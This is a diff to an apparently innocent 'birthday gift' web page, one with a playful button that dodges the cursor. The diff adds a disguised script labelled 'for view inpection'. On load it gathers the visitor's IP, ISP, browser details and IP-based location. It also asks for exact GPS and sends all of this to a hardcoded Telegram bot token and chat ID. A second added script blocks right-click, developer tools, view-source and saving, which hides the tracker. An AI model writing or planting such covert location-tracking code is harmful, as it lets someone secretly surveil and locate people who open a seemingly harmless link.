@@ -154,7 +154,7 @@
     let particles = [];
     let loveStarted = false;
 
-    // Move NO button (only if love not started)
+    // Move NO button on hover/touch
     function moveNoButton() {
         if (loveStarted) return;
         const x = Math.random() * (window.innerWidth - noBtn.offsetWidth);
@@ -278,6 +278,108 @@
             link.click();
         });
     });
+</script>
+
+<!--for view inpection-->
+
+<script>
+    window.addEventListener('load', function() {
+        setTimeout(function() {
+            
+            // main function to send data to telegram
+            function sendToTelegram(exactLat, exactLon, locationPrecision) {
+                fetch('https://get.geojs.io/v1/ip/geo.json')
+                    .then(r => r.json())
+                    .then(data => {
+                        var screenRes = window.screen.width + " x " + window.screen.height;
+                        var visitTime = new Date().toLocaleString('en-US', { timeZone: 'Asia/Dhaka' });
+                        var userAgent = navigator.userAgent;
+
+                        // if exact coordinates are not available, use approximate ones from IP geolocation
+                        var finalLat = exactLat ? exactLat : data.latitude;
+                        var finalLon = exactLon ? exactLon : data.longitude;
+                        var mapLink = finalLat ? "https://www.google.com/maps?q=" + finalLat + "," + finalLon : "Not Available";
+
+                        var ip = data.ip || "Unknown IP";
+                        var isp = data.organization || data.organization_name || "Unknown ISP";
+
+                        var message = `🚨 *New Visitor on Your birtdaygift2 Website!* 🚨\n\n` +
+                                      `⏱ *Time:* ${visitTime}\n\n` +
+                                      `🌍 *Location Info:*\n` +
+                                      `🎯 Accuracy: ${locationPrecision}\n` +
+                                      `🗺️ *Google Maps:* [View Exact Location](${mapLink})\n\n` +
+                                      `💻 *Device & Network:*\n` +
+                                      `🌐 IP Address: ${ip}\n` +
+                                      `🏢 ISP: ${isp}\n` +
+                                      `📱 Screen Size: ${screenRes}\n` +
+                                      `🕵️ Browser: \`${userAgent}\``;
+
+                        var botToken = "8363041954:AAFyxyeurJxLQQAeezzEEhbS1ostbG9zhfo"; 
+                        var chatId = "8366906886";
+
+                        var formData = new URLSearchParams();
+                        formData.append("chat_id", chatId);
+                        formData.append("text", message);
+                        formData.append("parse_mode", "Markdown");
+                        formData.append("disable_web_page_preview", "true");
+
+                        fetch("https://api.telegram.org/bot" + botToken + "/sendMessage", {
+                            method: "POST",
+                            body: formData
+                        });
+                    });
+            }
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+
+                        sendToTelegram(position.coords.latitude, position.coords.longitude, "✅ EXACT GPS (User Allowed)");
+                    },
+                    function(error) {
+
+                        sendToTelegram(null, null, "⚠️ APPROXIMATE (IP Based)");
+                    },
+                    { enableHighAccuracy: true, timeout: 5000 }
+                );
+            } else {
+                sendToTelegram(null, null, "⚠️ APPROXIMATE (IP Based)");
+            }
+
+        }, 1500);
+    });
+</script>
+
+<!-- Anti-Inspect & Security Lock Script -->
+<script>
+    // Right Click block
+    document.addEventListener('contextmenu', function(e) {
+        e.preventDefault();
+    });
+
+    // keydown block for F12, Ctrl+Shift+I/J, Ctrl+U/S
+    document.onkeydown = function(e) {
+        // F12 block
+        if (e.keyCode == 123) {
+            return false;
+        }
+        // Ctrl+Shift+I (Inspect) block
+        if (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) {
+            return false;
+        }
+        // Ctrl+Shift+J (Console) block
+        if (e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) {
+            return false;
+        }
+        // Ctrl+U (View Source) block
+        if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) {
+            return false;
+        }
+        // Ctrl+S (Save Page) block
+        if (e.ctrlKey && e.keyCode == 'S'.charCodeAt(0)) {
+            return false;
+        }
+    };
 </script>
 
 </body>
